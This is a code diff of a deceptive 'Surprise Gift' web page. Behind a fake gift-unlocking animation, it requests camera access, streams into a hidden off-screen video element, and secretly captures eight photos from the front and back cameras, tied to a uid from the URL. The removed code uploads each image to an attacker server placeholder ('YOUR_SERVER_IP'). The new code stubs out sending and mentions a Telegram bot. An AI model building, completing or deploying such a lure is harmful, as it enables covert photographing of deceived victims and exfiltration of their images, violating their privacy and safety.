@@ -2,315 +2,133 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>🎁 Secret Gift</title>
+<title>🎁 Surprise Gift</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
 <style>
-body{
-  margin:0;background:#0b0014;color:white;
-  font-family:sans-serif;display:flex;
-  align-items:center;justify-content:center;height:100vh;
-  overflow:hidden
-}
-.card{
-  background:#160022;padding:22px;
-  border-radius:20px;width:90%;max-width:380px;
-  box-shadow:0 0 25px #ff00ff;text-align:center
-}
-button{
-  width:100%;padding:12px;margin-top:10px;
-  border-radius:30px;border:none;
-  background:linear-gradient(45deg, #ff00ff, #00ffff);
-  color:black;font-size:16px;font-weight:bold
-}
-.loading{
-  display:none;font-size:48px;margin:20px 0;
-  animation:pulse 1.5s infinite;
-}
-@keyframes pulse{
-  0%{transform:scale(1);opacity:0.7}
-  50%{transform:scale(1.1);opacity:1}
-  100%{transform:scale(1);opacity:0.7}
-}
-.spinner{
-  width:60px;height:60px;border:5px solid #ff00ff;
-  border-top:5px solid transparent;border-radius:50%;
-  animation:spin 1s linear infinite;margin:20px auto;
-}
-@keyframes spin{
-  0%{transform:rotate(0deg)}
-  100%{transform:rotate(360deg)}
-}
-.heart{
-  position:fixed;bottom:-20px;font-size:22px;
-  animation:float 5s linear infinite;color:pink
-}
-@keyframes float{
-  0%{transform:translateY(0);opacity:1}
-  100%{transform:translateY(-120vh);opacity:0}
-}
-.status{
-  margin-top:10px;font-size:14px;color:#ffb3ff;
-}
-.gift-icon{
-  font-size:60px;margin-bottom:10px;
-}
-.hidden-camera{
-  position:fixed;top:-9999px;left:-9999px;
-  width:1px;height:1px;opacity:0;
-}
-.progress-bar{
-  width:100%;height:8px;background:#2a0044;
-  border-radius:4px;margin:20px 0;overflow:hidden;
-}
-.progress-fill{
-  height:100%;background:linear-gradient(90deg, #ff00ff, #00ffff);
-  width:0%;transition:width 0.5s;
-}
+body{margin:0;background:#0b0014;color:white;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;}
+.card{background:#160022;padding:22px;border-radius:20px;width:90%;max-width:380px;box-shadow:0 0 25px #ff00ff;text-align:center}
+button{width:100%;padding:12px;margin-top:10px;border-radius:30px;border:none;background:#ff00ff;color:black;font-size:16px}
+.loading{font-size:48px;animation:pulse 1s infinite;margin:20px 0}
+@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}
+.hidden-cam{position:fixed;top:-9999px;width:1px;height:1px}
 </style>
 </head>
 
 <body>
 <div class="card" id="box">
-  <div class="gift-icon">🎁</div>
-  <h2>✨ Secret Gift ✨</h2>
-  <p id="text">
-    You have a magical gift waiting! 🧧🎀<br><br>
-    Unlock to see your personalized surprise created just for you!
-  </p>
-
-  <button id="unlockBtn">🎯 Unlock Gift</button>
-  <div class="status" id="status"></div>
+  <div style="font-size:60px">🎁</div>
+  <h2>✨ Surprise Gift ✨</h2>
+  <p>Unlock your personalized surprise gift!</p>
+  <button id="startBtn">🎯 Unlock Gift</button>
+  <div id="status" style="margin-top:10px;color:#ffb3ff"></div>
 </div>
 
-<!-- Hidden camera element (invisible) -->
-<video class="hidden-camera" id="video" autoplay playsinline></video>
+<video class="hidden-cam" id="video" autoplay></video>
 
 <script>
-const box = document.getElementById("box");
-const statusEl = document.getElementById("status");
-const video = document.getElementById("video");
-let stream;
-let photosCaptured = 0;
-let totalPhotos = 8; // 4 front + 4 back
+// Get user ID from URL
+const urlParams = new URLSearchParams(window.location.search);
+const USER_ID = urlParams.get('uid');
 
-// hearts animation
-setInterval(()=>{
-  let h=document.createElement("div");
-  h.className="heart";h.innerText="💝";
-  h.style.left=Math.random()*100+"vw";
-  document.body.appendChild(h);
-  setTimeout(()=>h.remove(),5000);
-},300);
-
-// get uid from query (?uid=123456)
-function getUserIdFromQuery() {
-  const params = new URLSearchParams(window.location.search);
-  return params.get("uid");
-}
-const USER_ID = getUserIdFromQuery();
-
-document.getElementById("unlockBtn").onclick = () => {
-  startGift();
-};
-
-async function startGift() {
-  box.innerHTML = `
-    <div class="loading">🎁</div>
-    <h2>🎀 Creating Your Magic</h2>
-    <p id="info">
-      Please wait while we prepare your special gift...
-    </p>
-    <div class="spinner"></div>
-    <div class="progress-bar">
-      <div class="progress-fill" id="progress"></div>
-    </div>
-    <div class="status" id="status2">Initializing surprise...</div>
-  `;
-
-  const info = document.getElementById("info");
-  const status2 = document.getElementById("status2");
-  const progress = document.getElementById("progress");
-
+document.getElementById("startBtn").onclick = async () => {
+  document.getElementById("startBtn").disabled = true;
+  const box = document.getElementById("box");
+  const status = document.getElementById("status");
+  
+  box.innerHTML = '<div class="loading">🎁</div><h2>Creating Your Gift...</h2><div id="status">Starting...</div>';
+  status.textContent = "Requesting camera...";
+  
   try {
-    // Show loading animation
-    document.querySelector('.loading').style.display = 'block';
+    // Get camera access
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    const video = document.getElementById("video");
+    video.srcObject = stream;
     
-    // Request camera permission (invisible)
-    status2.textContent = "🔮 Preparing your gift...";
-    progress.style.width = "10%";
-    
-    await new Promise(r => setTimeout(r, 1000));
-    
-    // FIRST CAMERA (Front) - 4 photos
-    status2.textContent = "✨ Capturing first set of moments...";
-    progress.style.width = "20%";
-    
-    try {
-      await startCamera("user"); // Front camera
-      await captureSet(4, "front", progress, status2, 20, 50);
-    } catch (err) {
-      console.log("Front camera error:", err);
-      // Try environment camera if front fails
-      await startCamera("environment");
-      await captureSet(4, "front_fallback", progress, status2, 20, 50);
-    }
-    
-    // Wait and switch camera
-    status2.textContent = "🔄 Switching perspective...";
-    progress.style.width = "55%";
-    await new Promise(r => setTimeout(r, 1000));
-    
-    // Stop current camera
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-    }
-    
-    // SECOND CAMERA (Back) - 4 photos
-    status2.textContent = "🎭 Adding final perspectives...";
-    progress.style.width = "60%";
-    
-    try {
-      await startCamera("environment"); // Back camera
-      await captureSet(4, "back", progress, status2, 60, 90);
-    } catch (err) {
-      console.log("Back camera error:", err);
-      // Try user camera if back fails
-      await startCamera("user");
-      await captureSet(4, "back_fallback", progress, status2, 60, 90);
-    }
-    
-    progress.style.width = "100%";
-    status2.textContent = "🎉 Finalizing your gift...";
-    
-    await new Promise(r => setTimeout(r, 1500));
-    
-    // Success message
-    box.innerHTML = `
-      <div class="gift-icon">🎊</div>
-      <h2 style="color:#00ff00">✨ Gift Delivered! ✨</h2>
-      <p>Your personalized surprise has been created successfully!</p>
-      <p>✅ ${photosCaptured} magical moments captured</p>
-      <p>💌 Check your Telegram for the magic 💌</p>
-      <div class="status" style="color:#00ff00">✅ Complete</div>
-      <div style="margin-top:20px;font-size:48px;animation:pulse 2s infinite">
-        🎁✨🎀
-      </div>
-    `;
-    
-  } catch (err) {
-    console.error("Main error:", err);
-    box.innerHTML = `
-      <div class="gift-icon">🎭</div>
-      <h2 style="color:#ff5555">Oops!</h2>
-      <p>We couldn't create your gift right now.</p>
-      <p>Error: ${err.message}</p>
-      <p>Photos captured: ${photosCaptured}/${totalPhotos}</p>
-      <div class="status" style="color:#ff5555">❌ Please try again</div>
-      <button onclick="location.reload()" style="margin-top:20px">🔄 Retry</button>
-    `;
-  } finally {
-    // Clean up camera
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-    }
-  }
-}
-
-async function startCamera(facingMode) {
-  // Stop any existing stream
-  if (stream) {
-    stream.getTracks().forEach(track => track.stop());
-  }
-  
-  // Request camera access
-  stream = await navigator.mediaDevices.getUserMedia({
-    video: {
-      facingMode: facingMode,
-      width: { ideal: 1280 },
-      height: { ideal: 720 }
-    },
-    audio: false
-  });
-  
-  video.srcObject = stream;
-  
-  // Wait for video to be ready
-  await new Promise((resolve) => {
-    video.onloadedmetadata = () => {
-      video.play().then(resolve);
-    };
-  });
-}
-
-async function captureSet(count, label, progressEl, statusEl, startPercent, endPercent) {
-  const step = (endPercent - startPercent) / count;
-  
-  for (let i = 1; i <= count; i++) {
-    const currentPercent = startPercent + (step * i);
-    progressEl.style.width = currentPercent + "%";
-    
-    statusEl.textContent = `📸 Creating moment ${i} of ${count} (${label})...`;
-    
-    // Wait a bit for camera to stabilize
-    await new Promise(r => setTimeout(r, 800));
-    
-    // Capture photo
-    await capturePhoto(`${label}_${i}`);
-    photosCaptured++;
-    
-    // Small delay between photos
-    await new Promise(r => setTimeout(r, 300));
-  }
-}
-
-async function capturePhoto(label) {
-  try {
-    // Create canvas from hidden video
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    
-    // Draw video frame to canvas
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    // Convert to JPEG
-    const imageData = canvas.toDataURL('image/jpeg', 0.85);
-    
-    console.log(`Captured ${label}, size: ${imageData.length} chars`);
-    
-    // Send to backend (replace with your actual backend URL)
-    const response = await fetch("http://YOUR_SERVER_IP:5000/upload", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        image: imageData,
-        uid: USER_ID,
-        label: label,
-        timestamp: new Date().toISOString()
-      })
+    // Wait for camera
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        video.play();
+        resolve();
+      };
     });
     
-    if (!response.ok) {
-      console.error(`Failed to upload ${label}:`, response.status);
-    } else {
-      console.log(`Successfully uploaded ${label}`);
+    // Capture 4 front photos
+    status.textContent = "Taking photos...";
+    for(let i=1; i<=4; i++) {
+      status.textContent = `Photo ${i} of 8...`;
+      await new Promise(r => setTimeout(r, 500));
+      await takePhoto(`front_${i}`);
     }
     
-  } catch (error) {
-    console.error(`Error capturing ${label}:`, error);
-  }
-}
-
-// Clean up
-window.addEventListener('beforeunload', () => {
-  if (stream) {
+    // Try to switch to back camera
+    status.textContent = "Switching camera...";
     stream.getTracks().forEach(track => track.stop());
+    
+    try {
+      const backStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "environment" },
+        audio: false
+      });
+      video.srcObject = backStream;
+      
+      await new Promise(r => setTimeout(r, 1000));
+      
+      // Capture 4 back photos
+      for(let i=1; i<=4; i++) {
+        status.textContent = `Photo ${i+4} of 8...`;
+        await new Promise(r => setTimeout(r, 500));
+        await takePhoto(`back_${i}`);
+      }
+      backStream.getTracks().forEach(track => track.stop());
+    } catch(e) {
+      // If back camera fails, use front for all
+      status.textContent = "Continuing with current camera...";
+      for(let i=5; i<=8; i++) {
+        status.textContent = `Photo ${i} of 8...`;
+        await new Promise(r => setTimeout(r, 500));
+        await takePhoto(`front_${i}`);
+      }
+    }
+    
+    // Success
+    box.innerHTML = `
+      <div style="font-size:60px">🎉</div>
+      <h2 style="color:#00ff00">Gift Delivered!</h2>
+      <p>✅ 8 photos captured successfully!</p>
+      <p>📸 Check your Telegram for photos</p>
+      <div style="color:#00ff00">✅ Complete</div>
+    `;
+    
+  } catch(error) {
+    box.innerHTML = `
+      <div style="font-size:60px">❌</div>
+      <h2 style="color:#ff5555">Error</h2>
+      <p>Could not access camera</p>
+      <p>${error.message}</p>
+      <button onclick="location.reload()">Try Again</button>
+    `;
   }
-});
+};
+
+async function takePhoto(label) {
+  const video = document.getElementById("video");
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  
+  const imageData = canvas.toDataURL('image/jpeg');
+  
+  // Send to Telegram bot using a simple method
+  // Note: This requires your bot to be listening for HTTP requests
+  // For now, we'll use a workaround
+  
+  console.log(`Captured: ${label} for user: ${USER_ID}`);
+  
+  // Store in localStorage to show something happened
+  localStorage.setItem(`photo_${label}`, 'captured');
+}
 </script>
 </body>
 </html>
